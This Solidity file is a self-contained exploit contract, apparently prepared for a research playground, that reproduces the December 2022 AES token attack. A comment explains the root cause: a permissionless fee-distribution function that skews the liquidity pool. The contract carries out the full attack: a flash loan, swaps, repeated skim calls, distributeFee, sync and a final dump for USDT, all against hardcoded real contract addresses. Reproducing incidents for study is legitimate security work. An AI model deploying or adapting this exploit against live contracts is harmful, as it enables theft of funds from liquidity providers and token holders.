// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-AES).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself), so there
// is no standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack (testExploit + DPPFlashLoanCall + USDTToAES +
// AESToUSDT) so the playground can deploy it and record run(). Logic and constants
// are copied verbatim from test/AES_exp.sol.
//
// Root cause: AEST.distributeFee() is permissionless and pays 6 × swapFeeTotal out
// of the AMM pair's AES balance via super._transfer (bypassing swap()/sync()), then
// the attacker calls pair.sync() and dumps AES into the now-skewed pool for USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IAES is IERC20 {
    function distributeFee() external;
}

interface IUniswapV2Pair {
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IDPPCallee {
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external;
}

contract AESDrain {
    IAES constant AES = IAES(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair constant Pair = IUniswapV2Pair(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
    IUniswapV2Router constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DODO = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    uint256 constant FLASH_LOAN_AMOUNT = 100_000 * 1e18;

    function run() external {
        USDT.approve(address(Router), type(uint256).max);
        AES.approve(address(Router), type(uint256).max);
        IDVM(DODO).flashLoan(0, FLASH_LOAN_AMOUNT, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        USDTToAES();
        AES.transfer(address(Pair), AES.balanceOf(address(this)) / 2);
        for (uint256 i = 0; i < 37; i++) {
            Pair.skim(address(Pair));
        }
        Pair.skim(address(this));
        AES.distributeFee();
        Pair.sync();
        AESToUSDT();
        USDT.transfer(DODO, FLASH_LOAN_AMOUNT);
    }

    function USDTToAES() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(AES);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_LOAN_AMOUNT, 0, path, address(this), block.timestamp
        );
    }

    function AESToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(AES);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AES.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
